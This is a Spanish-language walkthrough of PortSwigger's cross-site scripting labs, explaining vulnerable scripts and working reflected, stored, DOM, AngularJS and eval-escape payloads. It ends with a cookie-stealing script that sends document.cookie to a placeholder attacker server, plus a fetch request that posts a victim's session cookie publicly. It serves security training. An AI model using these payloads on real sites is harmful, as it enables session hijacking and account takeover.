---
description: All labs of Portswigger https://portswigger.net/web-security/all-labs
---

# Cross-Site-Scripting (Labs)

### Reflected XSS into HTML context with nothing encoded

Vemos un input para buscar contenido, probamos su función y vemos que al escribir cualquier cosa, se ve reflejado en el HTML posterior.

![Formulario de búsqueda](<../.gitbook/assets/image (25).png>)

Al ver reflejado lo que buscamos podemos pensar que quizás se puede inyectar código, probemos con lo más básico.

```
<script>alert()</script>
```

Y nos sale el mensaje de alerta

![Mensaje de alerta](<../.gitbook/assets/image (27) (1).png>)

### Stored XSS into HTML context with nothing encoded

En este caso tenemos que escribir un comentario que provoque un Stored XSS, es decir, que cada persona que entrase en la página donde está dicho comentario le salte el código inyectado.

Probamos directamente a meter el básico en el texto del comentario:

```
<script>alert()</script>
```

¡Y funciona!

### DOM XSS in document.write sink using source location.search

Otra vez tenemos el Input de búsqueda, y también nos imprime como en el primero lo que escribimos, pero cuando probamos el básico de antes vemos que no funciona.

En este caso inspeccionamos el elemento y encontramos el script que está haciendo posible la búsqueda:

```
trackSearch(query) {
document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
trackSearch(query);
}
                    
```

donde pone query parece ser que es donde se añadirá la petición que hagamos, de hecho si miramos un poco más abajo en el código vemos lo siguiente:

```
<img src="/resources/images/tracker.gif?searchTerms=cualquier_cosa">
```

Por lo que podemos construir una query que acabe con esa, por ejemplo:

```
asd'"><script>alert()</script> <"

#Esto quedaría de la siguiente forma en el script
<img src="..searchTerms='asd'"><script>alert()</script> <"">');
```

También podéis optar por la respuesta de PortSwigger algo más elegante:

```
"><svg onload=alert(1)>
```

### DOM XSS in document.write sink using source location.search inside a select element

En este caso nos tenemos que ir dentro de uno de los elementos de la "tienda" y vemos que hay un formulario que realiza un "Check stock" Cómo antes vamos a inspeccionarlo a ver si vemos algo.

Efectivamente encontramos un script:

```
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
    }
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
        continue;
    }
    document.write('<option>'+stores[i]+'</option>');
    }
document.write('</select>');                
```

Básicamente estamos viendo que aparte de los valores que tienes en la variable stores, que coinciden con los del formulario que estamos viendo también existe otra variable que luego añade al formulario.

Lo importante es ¿De donde coge esa variable?

```
var store = (new URLSearchParams(window.location.search)).get('storeId');
```

Parece ser que busca dentro de los parámetros de la URL uno que se llame 'storeId', ¿Esto quiere decir que si introducimos ese valor en la URL el formulario cambia? Comprobemoslo:

```
.../product?productId=1&storeId=cualquier_cosa
```

![Formulario](<../.gitbook/assets/image (26).png>)

¡Perfecto! Ahora nos queda comprobar que ocurre si inyectamos una alerta, no parece que haga ningún tipo de validación de datos, así que vamos a comprobar a lo fácil:

```
.../product?productId=1&storeId=<script>alert()</script>
```

![Mensaje de alerta](<../.gitbook/assets/image (29) (1).png>)

¡Funcionó!

### DOM XSS in innerHTML sink using source location.search

Volvemos a tener el formulario de búsqueda, y además nos encontramos el siguiente script al inspeccionar:

```
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
    }
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    doSearchQuery(query);
    }
```

Nos damos cuenta que lo que escribimos lo añade directamente al HTML justo en el div superior, por lo que podemos probar a introducir algo que al cargar genere una respuesta en script

```
<img src="https://acb51f291fa14bcbc0ddb3ef008e000d.web-security-academy.net/resources/labheader/images/logoAcademy.svg" onload="alert()">
```

![Formulario búsqueda tras inyección](<../.gitbook/assets/image (24).png>)

Este quise probarlo porque me llamaba la atención que pueda introducir una imagen directamente, y de paso termino el ejercicio gracias al parámetro "onload" pero podríamos realizarlo de otras formas, por ejemplo con un onerror:

```
<img src="" onerror=alert()>
```

### DOM XSS in jQuery anchor href attribute sink using location.search source

En esta ocasión parece que tenemos que explotar un stored XSS, por lo que nos vamos a donde dice Submit Feedback y vamos a inspeccionar a ver si vemos algo:

```
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
    });
```

Para acabar el ejercicio tenemos que conseguir una alerta con el "document.cookie", y vemos que en el script superior está utilizando el parámetro GET de la url para determinar el href de un botón.

Probamos entonces a poner en la URL tras returnPATH=dondeestas, recargamos y tras inspeccionar la página vemos que el botón de back de abajo tiene el siguiente href:

```
href="dondeestas"
```

Así que vamos a transformarlo en algo que pueda darnos las cookies:

```
dondeestas" onload="alert(document.cookie)

#Quedaría tal que así
href="dondeestas" onload="alert(document.cookie)">
```

Pero resulta que no nos funciona y nos intenta mandar a la siguiente URL "https://../dondeestas" onload="alert(document.cookie)" Pero aún podemos probar mediante el comando "javascript:" Esto nos permite hacer que un href realice alguna función, cómo por ejemplo cambiar el color del fondo [https://www.w3schools.com/jsref/tryit.asp?filename=tryjsref\_oper\_void](https://www.w3schools.com/jsref/tryit.asp?filename=tryjsref\_oper\_void)

```
feedback?returnPath=javascript:alert(document.cookie)
```

¡Y conseguimos acabar el ejercicio!

### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

Utilizamos el formulario de búsqueda y al inspeccionar el código en esta ocasión aunque no tenemos un script como tal si que vemos que en body tenemos la directiva ng-app=""

Esta directiva le dice a AngularJS que este es el elemento raíz de la aplicación AngularJS, por lo que podemos utilizar una expresión Angular

```
{{$on.constructor('alert()')()}}
```

### Reflected DOM XSS

Si inspeccionamos el código fuente veremos que search llama a un .js alojado en otro sitio. Entramos y echamos un ojo, vemos que la respuesta se utiliza con una función eval y con algunas pruebas vemos qué esta escapando, en este caso las comillas pero no la barra invertida.

Lo que debemos hacer entonces es primero escapar la barra invertida mediante otra barra invertida "\\" cerramos el término de búsqueda con unas comillas dobles '"', separamos las expresiones con un operador, llamamos a alert cerramos la llave '}' para terminar la función y comentamos lo que haya detrás con dos barras '//'

```
\"/alert(1)}//
```

### Stored DOM XSS

Si miramos bien el código fuente nos damos cuenta de que existe un .js que es el encargado de cargar los comentarios, así que le echamos un ojo y vemos que realiza una función replace contra el símbolo menor que "<" y mayor que ">".

Realmente la función replace únicamente hace efecto con la primera coincidencia que encuentra. Para hacernos una idea en el siguiente código reemplazaríamos Hola por adiós.

```html
<!DOCTYPE html>
<html>
<body>

<p id="demo">Hola Paco</p>

<script>
let text = document.getElementById("demo").innerHTML; 
document.getElementById("demo").innerHTML = text.replace("Hola", "Adios");;
</script>

</body>
</html>
```

![Output del código](<../.gitbook/assets/image (27).png>)

Sin embargo si ponemos dos Holas:

```html
<!DOCTYPE html>
<html>
<body>

<p id="demo">Hola Hola Paco</p>

<script>
let text = document.getElementById("demo").innerHTML; 
document.getElementById("demo").innerHTML = text.replace("Hola", "Adios");;
</script>

</body>
</html>
```

![Output código](<../.gitbook/assets/image (29).png>)

Con esto realmente ya sabemos que si escapamos por primera vez esos símbolos que están siendo reemplazados podemos inyectar nuestro código, o al menos intentarlo:

```
<><img src="" onerror=alert()> 
```

Y efectivamente funciona.

### Exploiting cross-site scripting to steal cookies

Para realizar este laboratorio se requiere Burpsuite Pro, así que vamos a deducir la forma de realizarlo. Nos piden que robemos una cookie de sesión de un usuario ficticio que estará viendo la web y nos logueemos como si fuésemos él.

Viendo que en los comentarios un simple:

```
<script>alert()</script>
```

Funciona perfectamente, yo mandaría entonces el siguiente script:

```
<script>document.write("<img src="http://URLdemiservidoratacante/img.jpg?cookie=' + document.cookie + '">)</script>
```

De esta manera estoy enviando por una petición GET las cookies y puedo ver la petición en mi propio servidor.

#### ¡¡IMPORTANTE!!

Volviendo a este ejemplo de XSS me di cuenta que no necesitamos BurpsuitePro para acabar el lab, ya que podemos aprovecharnos de un CSRF, tras mirar por Burpsuite las peticiones a la hora de rellenar un formulario intenté diseñar una petición mediante fetch de javascript a la propia web para que publicase automáticamente su cookie de sesión en el foro.

Por supuesto esto no tendría sentido en un ataque ya que generalmente lo que va a querer el atacante es obtener la cookie de sesión sin llamar la atención y sin mostrarla a todo el mundo, pero es un método para acabar el laboratorio así que a por ello.

La idea es utilizar el siguiente script, obligar al usuario a enviar un comentario con él incluido.

```
<script>document.write('cookie: ' + document.cookie)</script>
```

Así que vamos a crear la petición para aprovecharnos del CSRF

```
<script>
fetch('https://acf31f071e6ced55c089267300ff0020.web-security-academy.net/post/comment', {
method: 'POST',
headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Referer': 'https://acf31f071e6ced55c089267300ff0020.web-security-academy.net/post?postId=8',
},
body: 'csrf=x3p64R9mnwJjh3odu96W7Ei1ZYmgJADU&postId=8&comment=%3Cscript%3Edocument.write%28%27cookie%3A+%27+%2B+document.cookie%29%3C%2Fscript%3E&name=admin&email=admin%40prueba.com&website='
});
</script>
```
